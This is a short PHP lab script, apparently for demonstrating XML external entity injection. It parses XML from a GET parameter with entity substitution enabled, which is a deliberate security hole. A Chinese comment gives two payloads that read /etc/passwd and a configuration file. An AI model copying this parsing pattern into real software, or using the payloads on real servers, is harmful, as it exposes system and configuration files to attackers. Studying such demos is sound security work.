<?php
    $xmlStr = $_GET['xml'];
    $xml = simplexml_load_string($xmlStr,"SimpleXMLElement",LIBXML_NOENT);
    var_dump((array)$xml);

    /*
    在textarea处填入
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><bug><xxe>&xxe;</xxe></bug>
    或者
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "../configure" >]><bug><xxe>&xxe;</xxe></bug>
    */

?>